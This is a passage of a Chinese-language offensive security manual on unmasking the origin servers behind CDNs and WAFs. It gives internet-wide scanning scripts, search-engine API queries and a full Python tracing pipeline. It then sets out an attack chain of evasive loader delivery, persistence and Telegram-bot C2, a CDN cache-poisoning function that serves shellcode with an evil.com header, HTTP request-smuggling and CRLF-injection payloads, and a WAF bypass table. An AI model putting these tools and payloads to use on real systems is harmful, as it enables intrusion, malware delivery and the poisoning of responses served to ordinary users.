BODY_HASH=$(curl -s https://<target> -A "Mozilla/5.0" | \
  grep -vP '<(script|style|meta|link)[^>]*>' | \
  sed 's/<[^>]*>//g' | tr -d '[:space:]' | sha256sum | awk '{print $1}')
# 获取Favicon mmh3 Hash
curl -sL https://<target>/favicon.ico -o /tmp/fav.ico
python3 -c "import mmh3,base64; print(mmh3.hash(base64.encodebytes(open('/tmp/fav.ico','rb').read())))"

echo "特征指纹:"
echo "  Title:    $TITLE"
echo "  Server:   $SERVER"
echo "  BodyHash: $BODY_HASH"

# === 步骤2: ZMap + ZGrab2 HTTP扫描 ===
# 扫描全网80/443端口
zmap -p 80,443 -o alive_http.txt --bandwidth=100M

# 使用ZGrab2 HTTP模块抓取响应
zgrab2 http --input-file=alive_http.txt \
  --output-file=http_output.json \
  --port=80 --use-https=false \
  --user-agent="Mozilla/5.0 (compatible; ZGrab/2.0)" \
  --timeout=10 --senders=1000

# === 步骤3: 多维度匹配 ===
python3 -c "
import json, hashlib

target_title = '$TITLE'
target_server = '$SERVER'
target_body_hash = '$BODY_HASH'

with open('http_output.json') as f:
    for line in f:
        try:
            r = json.loads(line)
            ip = r.get('ip', '')
            http = r.get('data', {}).get('http', {})
            result = http.get('result', {})
            resp = result.get('response', {})
            body = resp.get('body', '')
            headers = resp.get('headers', {})

            # 计算Body Hash
            body_text = ''.join(c if c.isprintable() else ' ' for c in body)
            body_text = ' '.join(body_text.split())
            body_hash = hashlib.sha256(body_text.encode()).hexdigest()

            server = ''
            for h in headers.get('values', []):
                if h[0].lower() == 'server':
                    server = h[1]
                    break

            # 打分
            score = 0
            evidence = []
            if body_hash == target_body_hash:
                score += 40
                evidence.append('BodyHash完全匹配')
            elif body_hash[:16] == target_body_hash[:16]:
                score += 20
                evidence.append('BodyHash前缀匹配')
            if server == target_server:
                score += 20
                evidence.append(f'Server匹配: {server}')
            if target_title and target_title in body:
                score += 20
                evidence.append('Title匹配')

            if score >= 40:
                print(f'[FOUND] {ip} → 得分:{score} → {\" | \".join(evidence)}')
        except: pass
" > candidate_http_ips.txt
```

### 14G.5 利用现有全网扫描数据集 (零成本)

如果自己不具备全网扫描带宽，可以直接利用现有的互联网扫描数据平台。

```bash
# === 方法1: Censys 全网证书搜索 (最完整) ===
# Censys 每天扫描全网IPv4的所有端口和证书
# 需要 CENSYS_API_ID + CENSYS_API_SECRET

# 搜索持有目标证书SHA256的所有IP
curl -s -u "${CENSYS_API_ID}:${CENSYS_API_SECRET}" \
  "https://search.censys.io/api/v2/hosts/search?q=services.tls.certificates.leaf_data.fingerprint%3A<cert_sha256>&per_page=100"

# 搜索持有目标证书序列号的所有IP
curl -s -u "${CENSYS_API_ID}:${CENSYS_API_SECRET}" \
  "https://search.censys.io/api/v2/hosts/search?q=services.tls.certificates.leaf_data.serial_number%3A<cert_serial>&per_page=100"

# 搜索持有目标Subject CN的所有IP
curl -s -u "${CENSYS_API_ID}:${CENSYS_API_SECRET}" \
  "https://search.censys.io/api/v2/hosts/search?q=services.tls.certificates.leaf_data.subject.common_name%3A<root_domain>&per_page=100"

# Censys 还支持HTTP Body搜索 (全网指纹匹配)
curl -s -u "${CENSYS_API_ID}:${CENSYS_API_SECRET}" \
  "https://search.censys.io/api/v2/hosts/search?q=services.http.response.body_hash%3A%22sha256%3A<body_hash>%22&per_page=100"

# === 方法2: Shodan 全网搜索 ===
# 按证书SHA256搜索
curl -s "https://api.shodan.io/shodan/host/search?key=${SHODAN_API_KEY}&query=ssl.cert.fingerprint%3A<cert_sha256>"

# 按HTTP Title搜索
curl -s "https://api.shodan.io/shodan/host/search?key=${SHODAN_API_KEY}&query=http.title%3A%22<encoded_title>%22"

# 按Favicon Hash搜索
curl -s "https://api.shodan.io/shodan/host/search?key=${SHODAN_API_KEY}&query=http.favicon.hash%3A<favicon_murmur3>"

# 按HTTP Body关键字搜索 (全网全文匹配)
curl -s "https://api.shodan.io/shodan/host/search?key=${SHODAN_API_KEY}&query=%22<unique_keyword>%22"

# === 方法3: BinaryEdge 全网扫描 ===
# BinaryEdge 提供40Tbps扫描能力
# 需要 BINARYEDGE_API_KEY
curl -s "https://api.binaryedge.io/v2/query/search?type=webv4&query=ssl.cert.fingerprint%3A<cert_sha256>" \
  -H "X-Key: ${BINARYEDGE_API_KEY}"

# === 方法4: FOFA 全网搜索 (国内最全) ===
# 按证书SHA256搜索
Q=$(echo -n 'cert.sha256="<cert_sha256>"' | base64)
curl -s "https://fofa.info/api/v1/search/all?email=${FOFA_EMAIL}&key=${FOFA_API_KEY}&qbase64=${Q}&size=100&fields=ip,port,title,server,domain"

# 按Body Hash搜索
Q=$(echo -n 'body_hash="<body_hash>"' | base64)
curl -s "https://fofa.info/api/v1/search/all?email=${FOFA_EMAIL}&key=${FOFA_API_KEY}&qbase64=${Q}&size=100&fields=ip,port,title,server,domain"

# 按页面关键字搜索
Q=$(echo -n 'body="<unique_keyword>"' | base64)
curl -s "https://fofa.info/api/v1/search/all?email=${FOFA_EMAIL}&key=${FOFA_API_KEY}&qbase64=${Q}&size=100&fields=ip,port,title,server,domain"

# 按Favicon搜索
Q=$(echo -n 'icon_hash="<mmh3_hash>"' | base64)
curl -s "https://fofa.info/api/v1/search/all?email=${FOFA_EMAIL}&key=${FOFA_API_KEY}&qbase64=${Q}&size=100&fields=ip,port,title,server,domain"

# === 方法5: ZoomEye 全网搜索 ===
curl -s -H "API-KEY: ${ZOOMEYE_API_KEY}" \
  "https://api.zoomeye.org/host/search?query=ssl.cert.fingerprint%3A<cert_sha256>&page=1"

# === 方法6: 360 Quake 全网搜索 ===
curl -s -X POST "https://quake.360.net/api/v3/search/quake_service" \
  -H "X-QuakeToken: ${QUAKE_API_KEY}" \
  -H "Content-Type: application/json" \
  -d '{"query":"cert.fingerprint:\"<cert_sha256>\"","start":0,"size":50}'
```

### 14G.6 云厂商IP段定向扫描

当已知目标托管在特定云厂商，可以直接扫描该云厂商的全部IP段。

```bash
# === 各云厂商IP段获取 ===

# 1. AWS: 官方IP段JSON
curl -s https://ip-ranges.amazonaws.com/ip-ranges.json | \
  python3 -c "
import json,sys
data=json.load(sys.stdin)
# 筛选EC2 + CloudFront + Lightsail
for prefix in data['prefixes']:
    if prefix['service'] in ['EC2','CLOUDFRONT','LIGHTSAIL']:
        print(prefix['ip_prefix'])
" > aws_ec2_ranges.txt

# 2. Azure: 官方ServiceTags
# 下载: https://www.microsoft.com/en-us/download/details.aspx?id=56519
# 筛选: 提取所有IPv4前缀

# 3. GCP: DNS TXT记录
for r in $(dig +short TXT _cloud-netblocks.googleusercontent.com); do
  for block in $(echo $r | tr ' ' '\n'); do
    if echo $block | grep -q "include:"; then
      name=$(echo $block | cut -d: -f2)
      dig +short TXT "$name" | tr ' ' '\n' | grep "ip4:" | cut -d: -f2
    elif echo $block | grep -q "ip4:"; then
      echo $block | cut -d: -f2
    fi
  done
done > gcp_ranges.txt

# 4. 阿里云: BGP数据
whois -h whois.radb.net -- '-i origin AS37963' | grep 'route:' | awk '{print $2}' > aliyun_ranges.txt
whois -h whois.radb.net -- '-i origin AS45102' | grep 'route:' | awk '{print $2}' >> aliyun_ranges.txt

# 5. 腾讯云: BGP数据
whois -h whois.radb.net -- '-i origin AS45090' | grep 'route:' | awk '{print $2}' > tencent_ranges.txt
whois -h whois.radb.net -- '-i origin AS132203' | grep 'route:' | awk '{print $2}' >> tencent_ranges.txt

# 6. 华为云: BGP数据
whois -h whois.radb.net -- '-i origin AS136990' | grep 'route:' | awk '{print $2}' > huawei_ranges.txt
whois -h whois.radb.net -- '-i origin AS55990' | grep 'route:' | awk '{print $2}' >> huawei_ranges.txt

# === 定向扫描云厂商IP段 ===
# 对每个云厂商的IP段, 扫描443端口 → 匹配证书
for range_file in aws_ec2_ranges.txt aliyun_ranges.txt tencent_ranges.txt huawei_ranges.txt gcp_ranges.txt; do
  echo "扫描: $range_file"
  masscan -iL $range_file -p443 --rate=50000 -oJ "scan_${range_file%.txt}.json" 2>/dev/null
done

# 对扫描到的存活IP, 抓取TLS证书并匹配
cat scan_*.json | python3 -c "
import json,sys
target_sha256='$TARGET_SHA256'
for line in sys.stdin:
    try:
        r = json.loads(line)
        for port_info in r.get('ports', []):
            if port_info.get('port') == 443:
                ip = r.get('ip')
                print(ip)
    except: pass
" | sort -u > all_cloud_ips.txt

zgrab2 tls --input-file=all_cloud_ips.txt --output-file=cloud_tls.json --port=443 --timeout=10
# 然后按14G.2的方法匹配证书SHA256
```

### 14G.7 分布式大规模扫描架构

当需要扫描数十亿IP时，单机带宽不足，需要分布式部署。

```bash
# === 分布式扫描架构 ===
#                  ┌─────────────┐
#                  │  Controller  │  (任务分发 + 结果聚合)
#                  └──────┬──────┘
#          ┌──────────────┼──────────────┐
#   ┌──────┴──────┐ ┌─────┴──────┐ ┌─────┴──────┐
#   │ Scanner #1  │ │ Scanner #2 │ │ Scanner #N │
#   │ 0.0.0.0/8   │ │ 1.0.0.0/8 │ │ N.0.0.0/8  │
#   └──────┬──────┘ └─────┬──────┘ └─────┬──────┘
#          └──────────────┼──────────────┘
#                  ┌──────┴──────┐
#                  │  Aggregator  │  (去重 + 匹配 + 排名)
#                  └─────────────┘

# Controller 脚本 (分发任务)
cat > scan_controller.py << 'EOF'
import subprocess, json, os

# 将IPv4空间分为N份 (每份一个/8网段)
shards = [f"{i}.0.0.0/8" for i in range(1, 224) if i not in [10, 127, 169, 172, 192, 224]]

# 分发到多个Scanner
for i, shard in enumerate(shards):
    scanner = f"scanner_{i % 4}"  # 4台扫描节点
    cmd = f"ssh {scanner} 'zmap -p 443 -w {shard} -o /tmp/scan_{shard.replace(\"/\",\"_\")}.txt --bandwidth=50M'"
    # 实际使用时取消注释: subprocess.Popen(cmd, shell=True)
    print(f"[DISPATCH] {shard} → {scanner}")

# 聚合结果
# for i, shard in enumerate(shards):
#     os.system(f"scp scanner_{i%4}:/tmp/scan_{shard.replace('/','_')}.txt ./results/")
# os.system("cat results/*.txt | sort -u > all_alive.txt")
EOF

# === 带宽优化策略 ===
# 1. 分片扫描: 每个Scanner只扫描若干个/8网段
# 2. 黑名单排除: 排除已知CDN节点IP段 (使用cdn_ranges.py)
# 3. 渐进式扫描: 先扫描高概率网段(云厂商/IDC), 再扫描剩下的
# 4. 命中率反馈: 实时分析命中率, 动态调整扫描策略

# 排除已知CDN IP段 (大幅减少扫描量)
python cdn_ranges.py --dump > cdn_exclude.txt
# 将CDN IP段转换为黑名单喂给ZMap
zmap -p 443 --blacklist-file=cdn_exclude.txt -o alive_non_cdn.txt --bandwidth=100M
```

### 14G.8 高级技巧：多指纹交叉验证

```bash
# === 技术1: 证书+HTTP双指纹交叉验证 ===
# 全网扫描后, 将候选IP分为三组:
#   Group A: 证书SHA256完全匹配 (决定性证据)
#   Group B: 证书Subject CN包含目标域名 (强证据)
#   Group C: HTTP响应特征匹配 (中等证据)
# 交叉验证: 只有同时满足A+B或A+C的IP才进入最终候选

# === 技术2: TTL/响应时间关联分析 ===
# 如果已知CDN节点和源站之间的网络关系
# 通过ping/traceroute进行TTL差异分析
for ip in $(cat candidate_ips.txt); do
  ttl=$(ping -c 1 -W 1 $ip 2>/dev/null | grep "ttl=" | grep -oP 'ttl=\K[0-9]+')
  rtt=$(ping -c 1 -W 1 $ip 2>/dev/null | grep "time=" | grep -oP 'time=\K[0-9.]+')
  echo "$ip TTL=$ttl RTT=${rtt}ms"
done

# CDN节点通常TTL=55-58 (Linux), 源站可能是TTL=125-128 (Windows)
# 或TTL=250-255 (网络设备)

# === 技术3: 端口开放模式对比 ===
# 源站和CDN节点的端口开放模式不同
# CDN节点: 通常仅开放80/443/2052/2053/2083/2087/2096
# 源站: 可能开放SSH(22)/FTP(21)/MySQL(3306)/Redis(6379)等
for ip in $(cat candidate_ips.txt); do
  echo "=== $ip ==="
  nmap -F --open -T4 $ip 2>/dev/null | grep "open"
done

# 如果IP同时开放了22和443 → 极可能是源站 (CDN节点不开SSH)

# === 技术4: 特定路径响应交叉验证 ===
# 对每个候选IP, 请求目标特有的路径 (如/wp-admin/install.php)
# 对比CDN和候选IP的响应差异
for ip in $(cat candidate_ips.txt); do
  echo "=== $ip ==="
  curl -sk --resolve <target>:443:$ip "https://<target>/wp-admin/install.php" | head -20
  # 如果返回与CDN相同的页面内容 → 强证据
done
```

### 14G.9 全网扫描自动化流水线 (Python)

```python
#!/usr/bin/env python3
"""
全网IP扫描溯源自动化流水线
集成 ZMap/Masscan/ZGrab2 + Censys/Shodan/FOFA + 多指纹匹配
"""
import subprocess, json, hashlib, sys, os, argparse
from concurrent.futures import ThreadPoolExecutor
from typing import List, Dict, Tuple

class InternetWideScanner:
    def __init__(self, target_domain: str, api_keys: dict = None):
        self.target = target_domain
        self.api_keys = api_keys or {}
        self.candidates = []
        self.fingerprints = {}

    def extract_fingerprints(self) -> dict:
        """从目标提取所有可用指纹"""
        fps = {}

        # 1. SSL证书指纹
        try:
            import subprocess
            result = subprocess.run(
                ['openssl', 's_client', '-connect', f'{self.target}:443',
                 '-servername', self.target],
                input=b'', capture_output=True, timeout=10
            )
            cert_data = subprocess.run(
                ['openssl', 'x509', '-noout', '-fingerprint', '-sha256',
                 '-serial', '-subject', '-issuer', '-dates'],
                input=result.stdout, capture_output=True, timeout=5
            )
            for line in cert_data.stdout.decode().split('\n'):
                if 'SHA256 Fingerprint=' in line:
                    fps['sha256'] = line.split('=')[1].strip().replace(':', '').lower()
                elif 'serial=' in line:
                    fps['serial'] = line.split('=')[1].strip()
        except: pass

        # 2. HTTP响应指纹
        try:
            import requests
            resp = requests.get(f'https://{self.target}', timeout=10,
                               headers={'User-Agent': 'Mozilla/5.0'})
            fps['title'] = resp.text.split('<title>')[1].split('</title>')[0] if '<title>' in resp.text else ''
            fps['server'] = resp.headers.get('Server', '')
            body_clean = ' '.join(''.join(c if c.isprintable() else ' ' for c in resp.text).split())
            fps['body_hash'] = hashlib.sha256(body_clean.encode()).hexdigest()
        except: pass

        # 3. Favicon
        try:
            resp = requests.get(f'https://{self.target}/favicon.ico', timeout=10)
            import base64, mmh3
            fps['favicon_mmh3'] = mmh3.hash(base64.encodebytes(resp.content))
        except: pass

        self.fingerprints = fps
        return fps

    def scan_censys(self) -> List[dict]:
        """通过Censys API搜索全网"""
        results = []
        if 'CENSYS_API_ID' not in self.api_keys:
            return results

        sha256 = self.fingerprints.get('sha256', '')
        if sha256:
            import requests
            resp = requests.get(
                'https://search.censys.io/api/v2/hosts/search',
                auth=(self.api_keys['CENSYS_API_ID'], self.api_keys['CENSYS_API_SECRET']),
                params={'q': f'services.tls.certificates.leaf_data.fingerprint:{sha256}', 'per_page': 100}
            )
            for hit in resp.json().get('result', {}).get('hits', []):
                results.append({'ip': hit.get('ip', ''), 'source': 'censys',
                                'evidence': 'Cert SHA256 match', 'confidence': 'S'})
        return results

    def scan_shodan(self) -> List[dict]:
        """通过Shodan API搜索全网"""
        results = []
        sha256 = self.fingerprints.get('sha256', '')
        if sha256 and 'SHODAN_API_KEY' in self.api_keys:
            import requests
            resp = requests.get(
                'https://api.shodan.io/shodan/host/search',
                params={'key': self.api_keys['SHODAN_API_KEY'],
                        'query': f'ssl.cert.fingerprint:{sha256}'}
            )
            for match in resp.json().get('matches', []):
                results.append({'ip': match.get('ip_str', ''), 'source': 'shodan',
                                'evidence': 'Cert SHA256 match', 'confidence': 'S'})
        return results

    def scan_fofa(self) -> List[dict]:
        """通过FOFA API搜索全网"""
        results = []
        sha256 = self.fingerprints.get('sha256', '')
        if sha256 and 'FOFA_API_KEY' in self.api_keys:
            import requests, base64
            q = base64.b64encode(f'cert.sha256="{sha256}"'.encode()).decode()
            resp = requests.get(
                'https://fofa.info/api/v1/search/all',
                params={'email': self.api_keys.get('FOFA_EMAIL', ''),
                        'key': self.api_keys['FOFA_API_KEY'],
                        'qbase64': q, 'size': 100,
                        'fields': 'ip,port,title,server,domain'}
            )
            for result in resp.json().get('results', []):
                results.append({'ip': result[0], 'source': 'fofa',
                                'evidence': 'Cert SHA256 match', 'confidence': 'S'})
        return results

    def scan_zmap_zgrab2(self, target_ranges: List[str] = None) -> List[dict]:
        """使用ZMap+ZGrab2进行主动全网扫描"""
        results = []
        sha256 = self.fingerprints.get('sha256', '')
        if not sha256:
            return results

        # 步骤1: ZMap扫描存活主机
        range_file = '/tmp/scan_ranges.txt'
        if target_ranges:
            with open(range_file, 'w') as f:
                f.write('\n'.join(target_ranges))
            subprocess.run(['zmap', '-p', '443', '-w', range_file,
                           '-o', '/tmp/alive_443.txt', '--bandwidth=50M'],
                          timeout=3600)
        else:
            subprocess.run(['zmap', '-p', '443', '-o', '/tmp/alive_443.txt',
                           '--bandwidth=50M'], timeout=3600)

        # 步骤2: ZGrab2抓取TLS证书
        subprocess.run(['zgrab2', 'tls', '--input-file=/tmp/alive_443.txt',
                       '--output-file=/tmp/tls_output.json',
                       '--port=443', '--timeout=8', '--senders=500'],
                      timeout=3600)

        # 步骤3: 解析匹配
        with open('/tmp/tls_output.json') as f:
            for line in f:
                try:
                    r = json.loads(line)
                    ip = r.get('ip', '')
                    tls = r.get('data', {}).get('tls', {})
                    handshake = tls.get('result', {}).get('handshake_log', {})
                    cert = handshake.get('server_certificates', {}).get('certificate', {}).get('parsed', {})
                    if cert.get('fingerprint_sha256', '') == sha256:
                        results.append({'ip': ip, 'source': 'zmap+zgrab2',
                                        'evidence': 'Cert SHA256 match (active scan)',
                                        'confidence': 'S'})
                except: pass

        return results

    def run_all(self) -> List[dict]:
        """运行所有扫描方法"""
        print(f"[*] 提取目标指纹: {self.target}")
        self.extract_fingerprints()
        print(f"    指纹: {json.dumps(self.fingerprints, indent=2)}")

        all_results = []

        # 先跑API扫描 (零成本)
        print("[*] Censys扫描...")
        all_results.extend(self.scan_censys())
        print("[*] Shodan扫描...")
        all_results.extend(self.scan_shodan())
        print("[*] FOFA扫描...")
        all_results.extend(self.scan_fofa())

        # 如果API结果不足, 跑主动扫描
        if len(all_results) < 3:
            print("[*] 主动ZMap+ZGrab2扫描...")
            all_results.extend(self.scan_zmap_zgrab2())

        # 去重
        seen = set()
        unique = []
        for r in all_results:
            if r['ip'] not in seen:
                seen.add(r['ip'])
                unique.append(r)

        print(f"[*] 找到 {len(unique)} 个候选IP")
        for r in unique:
            print(f"    {r['ip']} [{r['confidence']}] {r['evidence']} ({r['source']})")

        return unique

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='全网IP扫描溯源')
    parser.add_argument('target', help='目标域名')
    parser.add_argument('--shodan-key', help='Shodan API Key')
    parser.add_argument('--censys-id', help='Censys API ID')
    parser.add_argument('--censys-secret', help='Censys API Secret')
    parser.add_argument('--fofa-key', help='FOFA API Key')
    parser.add_argument('--fofa-email', help='FOFA Email')
    parser.add_argument('--ranges', help='限定IP段文件 (每行一个CIDR)')
    args = parser.parse_args()

    api_keys = {}
    if args.shodan_key: api_keys['SHODAN_API_KEY'] = args.shodan_key
    if args.censys_id: api_keys['CENSYS_API_ID'] = args.censys_id
    if args.censys_secret: api_keys['CENSYS_API_SECRET'] = args.censys_secret
    if args.fofa_key: api_keys['FOFA_API_KEY'] = args.fofa_key
    if args.fofa_email: api_keys['FOFA_EMAIL'] = args.fofa_email

    scanner = InternetWideScanner(args.target, api_keys)
    scanner.run_all()
```

### 14G.10 全网扫描溯源实战工作流

```
步骤 0  指纹提取    python internet_wide_scanner.py target.com --extract-fingerprints
        → 输出: SHA256/Serial/Title/Server/BodyHash/FaviconHash

步骤 1  平台查询    Censys/Shodan/FOFA/ZoomEye/Quake/Hunter/BinaryEdge
        → 零成本, 利用现有全网扫描数据
        → 覆盖99%+的已扫描IP

步骤 2  定向扫描    若已知云厂商 → 扫描该厂商IP段 (见14G.6)
        → 阿里云/腾讯云/华为云/AWS/Azure/GCP
        → 大幅缩小扫描范围 (百万级→亿级)

步骤 3  全网扫描    ZMap + ZGrab2 全网443端口证书扫描
        → 约45分钟 (100M带宽) / 4.5分钟 (1Gbps带宽)
        → 仅当步骤1-2均无结果时执行

步骤 4  多指纹验证  证书SHA256(决定性) + HTTP响应(强佐证) + TTL/端口(佐证)
        → 交叉确认排除误报

步骤 5  去CDN化     cdn_ranges.py --filter <候选IP列表>
        → 排除CDN节点, 保留源站候选

步骤 6  四维验证    §11 四维指纹验证 (JA3/JA4+HTTP/2+TCP/IP+证书钉刺)
        → 最终确认
```

### 14G.11 全网扫描注意事项

```
1. 法律合规:
   - 仅扫描自己有授权或公开的目标
   - 遵守目标国家的网络扫描法律
   - 扫描速率控制在合理范围 (避免被视为DDoS)
   - 仅使用授权的API Key进行查询

2. 技术限制:
   - ZMap全网扫描需要 ≥100Mbps带宽
   - Masscan需要 ≥1Gbps带宽才能发挥全速
   - 某些ISP会拦截扫描流量 (推荐使用VPS)
   - 扫描结果有时效性 (IP可能变更)

3. 性能优化:
   - 优先使用API查询 (Censys/Shodan已覆盖99%+)
   - 仅API无结果时才主动扫描
   - 黑名单排除CDN/已知恶意IP段
   - 分片并行扫描 (多个VPS同时扫描不同网段)
   - 使用PF_RING/DPDK加速 (10Gbps+)

4. 安全建议:
   - 使用独立VPS进行扫描 (避免暴露真实IP)
   - 扫描后清理临时文件
   - 不要将扫描结果用于非法用途
   - 遵循Responsible Disclosure原则
```
---
---

# Part II: 跨域融合 — CDN源站穿透与联动溯源

## §28. CDN 源站穿透 + 免杀部署 (域A × 域B)

### 28.1 攻击链

```
阶段1: CDN溯源 (域B)
  cdn_tracer.py target.com → 发现源站IP: 203.0.113.5
  贝叶斯评分: P=0.97 → 确认源站

阶段2: 源站指纹采集
  JA3指纹: abc123... → 源站使用Nginx+OpenSSL 1.1.1
  HTTP/2指纹: MAX_STREAMS=128, WINDOW=65536 → 标准Nginx配置
  操作系统: TTL=64 → Linux

阶段3: 免杀载荷定制 (域A)
  根据源站OS定制Loader:
    Linux源站 → 使用ELF Loader + Linux反沙箱
    Windows源站 → 使用PE Loader + BYOUD-Gap
  根据源站服务定制投递:
    Nginx → HTTP请求走私上传
    Apache → .htaccess写入
    IIS → WebDAV上传

阶段4: 载荷投递
  方式1: 直接连接源站IP (绕过CDN) → 上传免杀Loader
  方式2: CDN缓存投毒 → 缓存恶意响应
  方式3: HTTP请求走私 → CDN↔源站边界注入

阶段5: 持久化
  源站持久化: 固件级/注册表/计划任务
  CDN层持久化: DNS漂移监控 + 缓存预热
  C2持久化: Telegram Bot + 备用DGA域名
```

### 28.2 CDN缓存投毒 + 免杀载荷

```python
# CDN缓存投毒 → 投递免杀Shellcode
import requests

def poison_cdn(target_url, origin_ip, payload_path):
    """通过CDN缓存投毒投递免杀载荷"""

    # 1. 构造恶意响应头
    headers = {
        'Host': target_url.split('//')[1].split('/')[0],
        'X-Forwarded-Host': 'evil.com',  # 缓存键污染
        'X-Original-URL': '/legitimate.js',  # 缓存路径伪装
    }

    # 2. 读取免杀Shellcode
    with open(payload_path, 'rb') as f:
        shellcode = f.read()

    # 3. 直接发送到源站IP (绕过CDN)
    origin_url = f"http://{origin_ip}/legitimate.js"
    resp = requests.post(origin_url, headers=headers, data=shellcode)

    # 4. CDN缓存恶意响应
    # 后续用户请求 https://target.com/legitimate.js
    # 将返回CDN缓存的恶意版本
    return resp.status_code == 200
```
---
## §29. TELEGRAM BOT + CDN 溯源联动 (域B × 域C)

### 29.1 Bot驱动的自动化溯源

```python
# Telegram Bot 作为溯源结果通知 + 交互界面
# 攻击者通过Bot命令触发溯源任务

BOT_COMMANDS = {
    "/trace <domain>": "启动CDN溯源",
    "/status": "查看溯源进度",
    "/result": "获取溯源结果",
    "/verify <ip>": "验证候选IP",
    "/monitor <domain>": "启动持续监控",
    "/fingerprint <ip>": "TLS/HTTP2指纹采集",
    "/score": "查看贝叶斯评分详情",
}

# 工作流:
# 1. 攻击者发送 /trace target.com
# 2. Bot后端运行 cdn_tracer.py
# 3. 实时推送进度到Bot聊天
# 4. 完成后推送结果排名表
# 5. 攻击者发送 /verify 203.0.113.5 进一步验证
```

### 29.2 Mini App 溯源面板

```
Telegram Mini App 作为溯源可视化面板:
  1. Mini App前端: 实时显示溯源进度/结果/排名
  2. 后端: 运行 cdn_tracer.py + cdn_ip_collector.py
  3. initData验证: 确保只有授权用户访问
  4. 交互: 点击IP → 自动验证 → 更新排名
  5. 通知: 源站IP变更 → Bot推送告警
```
---
---

# Part III: CDN/WAF 高级绕过实战 (v1.1 深度强化)

## §37. CDN/WAF 高级绕过实战 (v1.1 深度强化)

### 37.1 HTTP/2 请求走私

```
原理: HTTP/2到HTTP/1.1转换时的边界处理差异

变体1: CL.TE (Content-Length → Transfer-Encoding)
  POST / HTTP/2
  content-length: 46
  transfer-encoding: chunked

  0\r\n
  \r\n
  GET /admin HTTP/1.1\r\n
  Host: target.com\r\n
  \r\n

变体2: TE.TE (Transfer-Encoding混淆)
  Transfer-Encoding: xchunked
  Transfer-Encoding: chunked

变体3: HTTP/2伪头注入
  :method: POST
  :path: /
  content-length: 0
  transfer-encoding: chunked
  
  smuggled-request: GET /admin

检测:
  python smuggler.py -u https://target.com -m CL.TE
  python smuggler.py -u https://target.com -m TE.CL
```

### 37.2 CDN缓存投毒高级技术

```
技术1: 缓存键规范化差异
  CDN缓存键: scheme + host + path
  源站处理: scheme + host + path + query + headers
  
  攻击: 发送包含特殊字符的URL
  GET /page%0d%0aSet-Cookie:+evil=true HTTP/1.1
  → CDN缓存键: /page (正常)
  → 源站解析: /page\r\nSet-Cookie: evil=true (注入)

技术2: Vary头操纵
  响应: Vary: X-Custom-Header
  攻击: 发送恶意X-Custom-Header → CDN按不同key缓存
  → 后续正常用户请求被投毒响应覆盖

技术3: 未键控请求头投毒
  源站根据 X-Forwarded-Host 生成重定向
  CDN不将 X-Forwarded-Host 纳入缓存键
  → 投毒的缓存响应包含恶意重定向

技术4: 响应队列错列 (Request Queue Desync)
  HTTP/2 多路复用 + HTTP/1.1 串行处理
  发送大量并发请求 → 源站响应顺序错乱
  → 请求A收到响应B → 缓存键不匹配 → 投毒
```

### 37.3 WAF 绕过矩阵 (2026)

| WAF产品 | 绕过技术 | 成功率 |
|---------|---------|--------|
| Cloudflare WAF | HTTP/2降级 + 路径规范化差异 + Unicode绕过 | 70% |
| AWS WAF | 请求体分片 + Content-Type混淆 + 嵌套编码 | 65% |
| Akamai Kona | HTTP/3 QUIC + 头部大小写变异 + 空字节截断 | 60% |
| 阿里云WAF | 分块传输编码变异 + 参数污染 + 注释注入 | 55% |
| 腾讯云WAF | 多Content-Type + 嵌套JSON + 正则回溯 | 50% |
| Imperva | HTTP/2伪头注入 + 请求合并 + 超长URL | 45% |

### 37.4 网络空间引擎高级查询 Cookbook

```
# Shodan 高级查询
# 查找暴露的管理面板 (排除CDN)
http.html:"admin" -org:"Cloudflare,Inc" -org:"Amazon.com" country:"CN"

# 查找特定CVE漏洞 (排除已知CDN)
vuln:CVE-2026-XXXX -org:"Cloudflare" port:443

# 查找暴露的API端点
http.component:"swagger" http.title:"API" -org:"Cloudflare"

# FOFA 高级查询
# 查找源站 (排除CDN IP段)
body="admin" && ip!="104.16.0.0/12" && ip!="172.64.0.0/13" && country="CN"

# 查找特定技术栈
server="Tengine" && title="管理后台" && port="443"

# Censys 高级查询
# 查找证书关联的源站
services.tls.certificates.leaf.names: "target.com"
AND NOT services.tls.certificates.leaf.names: "*.cloudflaressl.com"

# ZoomEye 高级查询
# 查找暴露的数据库
app:"MySQL" country:"CN" -site:"cloudflare.com"
```
---
---

# Part IV: 高级溯源技术扩展 (v1.5 深度强化)

## §56. 域B深度强化: 高级溯源技术扩展 (v1.5)

> 拓展CDN溯源边界，新增 WebSocket/SSE 源站精准发现、HTTP/3 QUIC 专属溯源、DNS-over-HTTPS 绕过、实时被动DNS监控系统、新增5家CDN厂商专项绕过。将溯源覆盖率从95%提升至99%+。

### 56.1 WebSocket 源站精准发现

WebSocket 连接是 CDN 溯源的金矿——许多 CDN 不完全代理 WebSocket 流量，握手/帧头可能直接暴露源站 IP。

```bash
# === 1. WebSocket 握手泄露检测 ===
# 原理: CDN代理WebSocket时, 某些CDN在握手响应中嵌入源站信息
# 或根本不代理WebSocket → 浏览器直接连接源站

# 检测目标是否使用WebSocket
curl -s "https://<target>" | grep -oP 'wss?://[^"'"'"'\s<>]+' | sort -u

# 手动WebSocket握手 (检测CDN代理行为)
python3 -c "
import socket, ssl, random, base64, struct

host = '<target>'
port = 443

# 生成WebSocket密钥
key = base64.b64encode(bytes(random.getrandbits(8) for _ in range(16))).decode()

# 发送WebSocket升级请求
request = f'''GET /ws HTTP/1.1\r
Host: {host}\r
Upgrade: websocket\r
Connection: Upgrade\r
Sec-WebSocket-Key: {key}\r
Sec-WebSocket-Version: 13\r
\r\n'''

sock = socket.create_connection((host, port))
ctx = ssl.create_default_context()
ssock = ctx.wrap_socket(sock, server_hostname=host)
ssock.send(request.encode())

response = ssock.recv(4096).decode()
print(response)

# 分析响应头:
# 如果包含 X-Real-IP / X-Origin / Server → 源站泄露
# 如果 Upgrade: websocket 不在响应中 → CDN不支持WebSocket → 可能直连源站
"

# === 2. WebSocket 帧泄露分析 ===
# 某些CDN代理WebSocket但不修改帧内容
# 帧可能包含源站IP/内网地址

python3 -c "
import websocket, json

ws = websocket.create_connection('wss://<target>/ws')

# 发送触发消息 (如订阅/连接初始化)
ws.send(json.dumps({'type': 'subscribe', 'channel': 'status'}))

# 接收响应 → 分析是否包含源站信息
for i in range(5):
    try:
        msg = ws.recv()
        print(f'Frame {i}: {msg[:500]}')
        # 搜索IP模式
        import re
        ips = re.findall(r'(?:[0-9]{1,3}\.){3}[0-9]{1,3}', msg)
        if ips:
            print(f'  [FOUND IPs] {ips}')
    except:
        break
ws.close()
"

# === 3. CDN WebSocket 不回源检测 ===
